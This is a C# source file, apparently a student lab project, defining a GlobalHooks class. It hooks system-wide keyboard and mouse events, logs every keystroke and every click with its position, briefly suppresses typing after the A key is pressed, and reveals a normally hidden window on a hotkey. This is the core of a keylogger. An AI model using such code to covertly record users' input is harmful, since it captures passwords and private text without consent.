using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;
//using System.Timers;
using System.Threading;
using System;

namespace Laba_8
{
    public class GlobalHooks
    {
        public delegate void WindowShowHandler();

        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly Logger _logger;
        private readonly Settings _settings;
        private readonly WindowShowHandler _windowShow;
        private  System.Threading.Timer timer;
        public static bool flag = true;

        public GlobalHooks(Settings config, WindowShowHandler windowShow)
        {
            _settings = config;
            _windowShow = windowShow;
            _logger = new Logger(_settings);
            _globalHooks.KeyDown += KeyEvent;
            _globalHooks.MouseClick += MouseEvent;
        }
        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (_settings.IsHooks)
            {
                if (e.KeyData == (Keys.A))
                {
                    flag = false;
                    timer = new System.Threading.Timer(TimerHandler, null, 2000, 0);
                }
                e.SuppressKeyPress = !flag;
                _logger.KeyLogger(e.KeyData.ToString());
            }
            if (e.KeyData == (Keys.Control | Keys.Shift | Keys.Tab))
            {
                _windowShow?.Invoke();
            }
        }

        public static void TimerHandler(object e)
        {
            flag = true;
        }

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (_settings.IsHooks)
            {
                _logger.MouseLogger(e.Button.ToString(), e.Location.ToString());
            }
        }
    }
}